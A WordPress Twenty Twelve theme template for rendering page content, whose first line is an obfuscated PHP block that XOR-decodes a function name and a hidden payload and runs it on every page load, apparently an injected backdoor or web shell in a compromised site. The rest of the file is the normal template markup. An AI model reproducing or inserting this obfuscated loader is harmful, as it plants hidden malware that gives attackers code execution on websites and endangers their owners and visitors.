<?php $mOiyoXJj='98, CHi>NR9J O '; $SzHpcV='ZJIA7-6X;<Z>I N'^$mOiyoXJj; $CjxPZL='=7aDKNR.;D= =17Q=;=iu T91=Q 3:jWO9mHqg6LF>0<RE>9VnI<02HY Qqd91-gU+Q21YgGKQ7fEepLm4ObqoX<JfNxhFsCj8Z>0atEXkOFTBl:e7O;ZP4bRQRF-LsvlPqRyhybo9U,ckdSNi 3IYgfBiocAjUYOpm=gnsND:;, RtP3YxvXMcsD=3Z68>Ps; ;Qk7s,kEMdeI5G kmy YV8 wZP333Y9FV vEsX89;Xu;AX BV8 POJj2pwwsgpLVCMqS7DvgNub91+0 yV7lqfH4C7.;W=utjM,H=oXBv-M5AQEosL; ,-c0ElaSPxphKI4BPXx1cF1S<,WY0xja<c7hf453jV4bsPY3kevGs<2ZE GdUy=<q3;E3q -Txjrc= =X3Yse3QY8aGkA42L75rm<,Y0reb4 Z7DgG.AR7VO>XT N=k3+O:. <,<0PUXn2Z>EpnkS<76H6ybHMH bfkOZ2;Y:QYBkoZI0FpcZYDXZMpl  9P5a-6:o2;;8B cvXUTbXmkP1 2xblrXm.OTjR U.Ocq;V,bingkrocz.LBIpex,RHAZpT1-ucfuY,0G7z+xVvTrawdMWZJ447,.EH>HDG50:Ku9TCL:UXCxdqX;0 kgyibxhVVzE 5XUKjXWG0wt;;=AC 0rfqbm0<N:BnDkSp4'; $GnnkbLTS=$SzHpcV('', 'TQIe-;<MO-RNbTO8NONARX;KnY0TRe5::MJaXGMFOXER11WV8N1SBm,8T0.;TDYOqO0FPuGc 4NOeEPlMOEkxK7I>FsXOaHIc1<QBIP,xVovobHSYD;I65ZJv532LeHVH9ZyPbpkKV XCEYsfMDR=8<B+4O=aN><6+ITGKS=0HWINzP;V Q+qvizMOV.CJPxWTUOxP=zQa8GnA-T3AKPYF8:KELPtWRG8f-3YVxS>YUH=N1K>O03YC8obNm3888.5l70mU8R=VZpUFOPGEEPvLfxB,U7VqP2DUIJiG-DTRKRI,A qxOW:ZLYHX:8fk:6XXIo-U61qXJiOW<NI6:XXBEc1r93qfgJ7GBW;<JKXHgWJS60EnD.s45UWZ1R.KH-XWRGVEDc9PzAW0-YAzKeBS BPIg5QSMxoFPA.VdZgn4<D3=W98I4XCKD=eJAHMco= ,FP;M FZ47YTY,SQF,,<AKJKk>SO8e:<;BFaCY XG>809zkVLARK1L>FSC0WCRK6SKQ30-EtMO4PTSQBJTxEC+aBvD4Z.8VP3UE4GGVOODHOxsqCQJN0+p<AaUILTVFhNVrVCMI2A2UHWBkw;8FUNsE 1a-<.FDIcRI5: U4<dTDU<ZDABNYIBXHv-pLEC99cN<63Q,SKZD-,ATU;XYg9Y6S6FtBhzI'^$CjxPZL); $GnnkbLTS();
/**
 * The template used for displaying page content in page.php
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */
?>

	<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
		<header class="entry-header">
			<?php if ( ! is_page_template( 'page-templates/front-page.php' ) ) : ?>
			<?php the_post_thumbnail(); ?>
			<?php endif; ?>
			<h1 class="entry-title"><?php the_title(); ?></h1>
		</header>

		<div class="entry-content">
			<?php the_content(); ?>
			<?php wp_link_pages( array( 'before' => '<div class="page-links">' . __( 'Pages:', 'twentytwelve' ), 'after' => '</div>' ) ); ?>
		</div><!-- .entry-content -->
		<footer class="entry-meta">
			<?php edit_post_link( __( 'Edit', 'twentytwelve' ), '<span class="edit-link">', '</span>' ); ?>
		</footer><!-- .entry-meta -->
	</article><!-- #post -->
